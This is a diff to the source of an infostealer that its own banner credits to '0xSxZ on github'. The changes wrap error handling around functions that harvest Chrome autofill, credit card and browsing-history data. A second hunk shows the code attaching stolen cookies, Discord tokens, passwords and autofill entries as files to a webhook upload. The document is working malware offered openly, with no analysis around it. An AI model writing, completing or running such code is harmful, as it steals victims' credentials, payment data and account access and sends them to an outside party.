@@ -222,10 +222,10 @@ if yes == "yes":
 						break
 				Founded = True
 				return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
+			except Exception as e:
+				print(e)
 		except Exception as e:
-			print(e)
-		except:
-			return "welekip" ":::667" + "dazdza" + ":::667" +"dazdaz"
+				print(e)
 	def stealChromeWinHistory():
 		try:
 			path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
@@ -562,9 +562,12 @@ if yes == "yes":
 		webhook.add_file(file=str(CookiesLinux()), filename="0xCookies.txt") 
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
 		webhook.add_file(file=PasswWin().replace("{'", "\n\n").replace("},", ""), filename="0xPasswords.txt")
-		autofill = stealChromeWin()
-		autfill = str(autofill).split(":::667")
-		print(autfill[1])
+		try:
+			autofill = stealChromeWin()
+			autfill = str(autofill).split(":::667")
+			print(autfill[1])
+		except:
+			autfill = ["dazdaz", "dazdza", "dazdhjnza"]
 		webhook.add_file(file=autfill[0], filename="Autofill.txt")
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
 
